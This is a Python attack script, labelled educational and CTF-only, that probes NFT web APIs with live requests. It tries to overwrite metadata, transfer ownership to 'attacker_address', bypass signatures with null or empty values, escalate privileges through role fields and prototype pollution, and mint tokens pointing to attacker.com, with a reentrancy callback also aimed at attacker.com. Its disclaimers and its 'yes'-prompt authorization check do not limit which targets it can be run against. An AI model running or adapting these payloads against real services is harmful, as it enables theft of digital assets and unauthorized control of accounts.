#!/usr/bin/env python3
"""
NFT Takeover Educational Script
================================
EDUCATIONAL PURPOSE ONLY - FOR CTF/AUTHORIZED TESTING

This script demonstrates common NFT vulnerability patterns found in:
- CTF challenges
- Bug bounty programs (with authorization)
- Personal test environments

NEVER use this on systems you don't own or lack permission to test.
"""

import requests
import json
import hashlib
import time
from web3 import Web3
from eth_account import Account
import argparse
from colorama import init, Fore, Style

init(autoreset=True)

class NFTTakeoverEducational:
    """Educational NFT vulnerability demonstration class"""

    def __init__(self, target_url, contract_address=None):
        """
        Initialize the NFT takeover educational tool

        Args:
            target_url: The target API or web interface (must be authorized)
            contract_address: Smart contract address if applicable
        """
        self.target_url = target_url
        self.contract_address = contract_address
        self.session = requests.Session()
        self.w3 = None

        print(f"{Fore.YELLOW}[!] EDUCATIONAL TOOL - AUTHORIZED TESTING ONLY")
        print(f"{Fore.YELLOW}[!] Ensure you have permission to test: {target_url}")

    def check_authorization(self):
        """Verify this is a test environment"""
        test_indicators = [
            'localhost', '127.0.0.1', 'test', 'ctf',
            'hackthebox', 'tryhackme', 'demo', 'sandbox'
        ]

        if not any(indicator in self.target_url.lower() for indicator in test_indicators):
            response = input(f"{Fore.RED}[!] Target doesn't appear to be a test environment. Continue? (yes/no): ")
            if response.lower() != 'yes':
                print(f"{Fore.RED}[!] Exiting for safety.")
                exit(1)

    def test_metadata_manipulation(self):
        """
        Test 1: NFT Metadata Manipulation
        Many NFTs store metadata off-chain (IPFS, centralized servers)
        """
        print(f"\n{Fore.CYAN}[*] Testing NFT Metadata Manipulation...")

        # Common vulnerability: Predictable metadata URLs
        test_cases = [
            '/api/nft/metadata/1',
            '/metadata/1.json',
            '/api/tokens/1',
            '/nft/1',
        ]

        for endpoint in test_cases:
            try:
                url = f"{self.target_url}{endpoint}"
                response = self.session.get(url)

                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+] Found metadata endpoint: {url}")
                    metadata = response.json()
                    print(f"    Original metadata: {json.dumps(metadata, indent=2)}")

                    # Try to modify metadata (POST/PUT/PATCH)
                    for method in ['POST', 'PUT', 'PATCH']:
                        modified_metadata = metadata.copy()
                        modified_metadata['name'] = 'TAKEN_OVER_NFT'
                        modified_metadata['owner'] = 'attacker_address'

                        mod_response = self.session.request(
                            method, url,
                            json=modified_metadata,
                            headers={'Content-Type': 'application/json'}
                        )

                        if mod_response.status_code in [200, 201, 204]:
                            print(f"{Fore.GREEN}[+] Metadata modification successful via {method}!")
                            return True

            except Exception as e:
                print(f"{Fore.YELLOW}[-] Error testing {endpoint}: {e}")

        return False

    def test_ownership_transfer(self):
        """
        Test 2: Unauthorized Ownership Transfer
        Check for missing access controls on transfer functions
        """
        print(f"\n{Fore.CYAN}[*] Testing Unauthorized Ownership Transfer...")

        # Common vulnerable endpoints
        transfer_endpoints = [
            '/api/nft/transfer',
            '/api/transfer',
            '/transfer',
            '/api/nft/change-owner',
            '/api/tokens/transfer'
        ]

        test_payload = {
            'tokenId': '1',
            'from': 'original_owner',
            'to': 'attacker_address',
            'nftId': '1',
            'newOwner': 'attacker_address'
        }

        for endpoint in transfer_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"

                # Try different methods
                for method in ['POST', 'PUT']:
                    response = self.session.request(
                        method, url,
                        json=test_payload,
                        headers={'Content-Type': 'application/json'}
                    )

                    if response.status_code in [200, 201, 204]:
                        print(f"{Fore.GREEN}[+] Ownership transfer successful at {url}!")
                        print(f"    Response: {response.text}")
                        return True

            except Exception as e:
                print(f"{Fore.YELLOW}[-] Error testing {endpoint}: {e}")

        return False

    def test_reentrancy(self):
        """
        Test 3: Reentrancy Attack Simulation
        Check if NFT contract is vulnerable to reentrancy
        """
        print(f"\n{Fore.CYAN}[*] Testing for Reentrancy Vulnerabilities...")

        # This would require web3 connection to actual contract
        if self.contract_address and self.w3:
            print(f"{Fore.YELLOW}[!] Would test contract at: {self.contract_address}")
            # In real scenario, would attempt reentrancy on withdraw/transfer functions

        # Test via API for reentrancy indicators
        reentrancy_test = {
            'action': 'withdraw',
            'callback': 'http://attacker.com/reenter',
            'amount': '1000000'
        }

        try:
            response = self.session.post(
                f"{self.target_url}/api/nft/withdraw",
                json=reentrancy_test
            )

            if 'callback' in response.text.lower():
                print(f"{Fore.GREEN}[+] Possible reentrancy vulnerability detected!")
                return True

        except Exception as e:
            print(f"{Fore.YELLOW}[-] Reentrancy test error: {e}")

        return False

    def test_signature_bypass(self):
        """
        Test 4: Signature Verification Bypass
        Check if signature validation can be bypassed
        """
        print(f"\n{Fore.CYAN}[*] Testing Signature Verification Bypass...")

        # Common signature bypass techniques
        bypass_payloads = [
            {'signature': '0x0000000000000000000000000000000000000000'},  # Null signature
            {'signature': ''},  # Empty signature
            {'no_signature': 'true'},  # Missing signature
            {'signature': 'admin'},  # Weak signature
        ]

        for payload in bypass_payloads:
            try:
                test_data = {
                    'tokenId': '1',
                    'action': 'transfer',
                    'to': 'attacker_address',
                    **payload
                }

                response = self.session.post(
                    f"{self.target_url}/api/nft/action",
                    json=test_data
                )

                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+] Signature bypass successful with: {payload}")
                    return True

            except Exception as e:
                print(f"{Fore.YELLOW}[-] Signature test error: {e}")

        return False

    def test_privilege_escalation(self):
        """
        Test 5: Privilege Escalation via Role Manipulation
        """
        print(f"\n{Fore.CYAN}[*] Testing Privilege Escalation...")

        # Try to escalate privileges
        escalation_payloads = [
            {'role': 'admin', 'userId': '1'},
            {'isAdmin': True, 'user': 'attacker'},
            {'permissions': ['mint', 'burn', 'transfer', 'admin']},
            {'__proto__': {'isAdmin': True}},  # Prototype pollution
        ]

        for payload in escalation_payloads:
            try:
                response = self.session.post(
                    f"{self.target_url}/api/user/update",
                    json=payload
                )

                if response.status_code in [200, 201]:
                    print(f"{Fore.GREEN}[+] Privilege escalation successful!")
                    return True

            except Exception as e:
                print(f"{Fore.YELLOW}[-] Privilege escalation test error: {e}")

        return False

    def test_mint_vulnerability(self):
        """
        Test 6: Unauthorized Minting
        Check if NFTs can be minted without authorization
        """
        print(f"\n{Fore.CYAN}[*] Testing Unauthorized Minting...")

        mint_payload = {
            'to': 'attacker_address',
            'tokenURI': 'http://attacker.com/fake-nft.json',
            'quantity': 100,
            'metadata': {
                'name': 'Unauthorized NFT',
                'description': 'Minted without permission',
                'image': 'http://attacker.com/image.png'
            }
        }

        mint_endpoints = [
            '/api/nft/mint',
            '/api/mint',
            '/mint',
            '/api/tokens/create'
        ]

        for endpoint in mint_endpoints:
            try:
                response = self.session.post(
                    f"{self.target_url}{endpoint}",
                    json=mint_payload
                )

                if response.status_code in [200, 201]:
                    print(f"{Fore.GREEN}[+] Unauthorized minting successful at {endpoint}!")
                    print(f"    Response: {response.text}")
                    return True

            except Exception as e:
                print(f"{Fore.YELLOW}[-] Mint test error at {endpoint}: {e}")

        return False

    def run_all_tests(self):
        """Run all NFT takeover tests"""
        print(f"\n{Fore.CYAN}{'='*50}")
        print(f"{Fore.CYAN}Starting NFT Takeover Educational Tests")
        print(f"{Fore.CYAN}{'='*50}")

        self.check_authorization()

        results = {
            'Metadata Manipulation': self.test_metadata_manipulation(),
            'Ownership Transfer': self.test_ownership_transfer(),
            'Reentrancy': self.test_reentrancy(),
            'Signature Bypass': self.test_signature_bypass(),
            'Privilege Escalation': self.test_privilege_escalation(),
            'Unauthorized Minting': self.test_mint_vulnerability(),
        }

        print(f"\n{Fore.CYAN}{'='*50}")
        print(f"{Fore.CYAN}Test Results Summary:")
        print(f"{Fore.CYAN}{'='*50}")

        for test, result in results.items():
            status = f"{Fore.GREEN}VULNERABLE" if result else f"{Fore.RED}SECURE"
            print(f"{test}: {status}")

        vulnerable_count = sum(results.values())
        print(f"\n{Fore.YELLOW}[!] Found {vulnerable_count} potential vulnerabilities")

        if vulnerable_count > 0:
            print(f"{Fore.YELLOW}[!] Remember: Only exploit these in authorized environments!")

        return results


def main():
    parser = argparse.ArgumentParser(
        description='NFT Takeover Educational Tool - CTF/Authorized Testing Only'
    )
    parser.add_argument(
        'target',
        help='Target URL (must be authorized test environment)'
    )
    parser.add_argument(
        '--contract',
        help='Smart contract address (optional)',
        default=None
    )
    parser.add_argument(
        '--specific-test',
        choices=['metadata', 'transfer', 'reentrancy', 'signature', 'privilege', 'mint'],
        help='Run specific test only'
    )

    args = parser.parse_args()

    print(f"{Fore.RED}{'='*60}")
    print(f"{Fore.RED}DISCLAIMER: EDUCATIONAL PURPOSE ONLY")
    print(f"{Fore.RED}Only use on systems you own or have permission to test!")
    print(f"{Fore.RED}{'='*60}\n")

    # Initialize the tester
    tester = NFTTakeoverEducational(args.target, args.contract)

    # Run specific test or all tests
    if args.specific_test:
        test_map = {
            'metadata': tester.test_metadata_manipulation,
            'transfer': tester.test_ownership_transfer,
            'reentrancy': tester.test_reentrancy,
            'signature': tester.test_signature_bypass,
            'privilege': tester.test_privilege_escalation,
            'mint': tester.test_mint_vulnerability,
        }

        print(f"{Fore.CYAN}[*] Running specific test: {args.specific_test}")
        result = test_map[args.specific_test]()

        if result:
            print(f"{Fore.GREEN}[+] Vulnerability found!")
        else:
            print(f"{Fore.RED}[-] No vulnerability found")
    else:
        tester.run_all_tests()


if __name__ == '__main__':
    main()